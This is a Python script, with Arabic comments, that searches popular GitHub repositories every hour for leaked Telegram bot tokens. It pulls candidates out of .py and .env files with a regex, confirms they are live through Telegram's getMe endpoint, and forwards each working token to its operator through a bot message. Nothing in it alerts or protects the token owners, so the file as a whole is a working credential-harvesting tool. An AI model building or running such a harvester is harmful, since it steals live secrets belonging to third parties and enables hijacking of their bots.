كimport asyncio
import re
import aiohttp
from github import Github
import os

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)
scanned_repos = set()

async def validate_token(session, token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        async with session.get(url, timeout=5) as resp:
            if resp.status == 200:
                return await resp.json()
    except Exception:
        pass
    return None

async def run_scanner(bot_interface):
    """عملية الفحص الدورية"""
    print("[SYSTEM] Scanner Engine: Started.")
    while True:
        try:
            # البحث عن مستودعات نشطة
            repos = g.search_repositories(query="telegram bot token", sort="updated")[:20]
            
            async with aiohttp.ClientSession() as session:
                for repo in repos:
                    if repo.full_name in scanned_repos or repo.stargazers_count < 50:
                        continue
                        
                    print(f"[SYSTEM] Scanning: {repo.full_name}")
                    scanned_repos.add(repo.full_name)
                    
                    try:
                        contents = repo.get_contents("")
                        for content in contents:
                            if content.type == "file" and content.name.endswith(('.py', '.env')):
                                text = content.decoded_content.decode('utf-8')
                                tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', text)
                                for token in tokens:
                                    valid = await validate_token(session, token)
                                    if valid:
                                        await bot_interface.send_message(f"🚨 New Token Found: `{token}`")
                    except Exception:
                        continue
        except Exception as e:
            print(f"[ERROR] Scanner loop: {e}")
            
        await asyncio.sleep(3600) # فحص كل ساعة
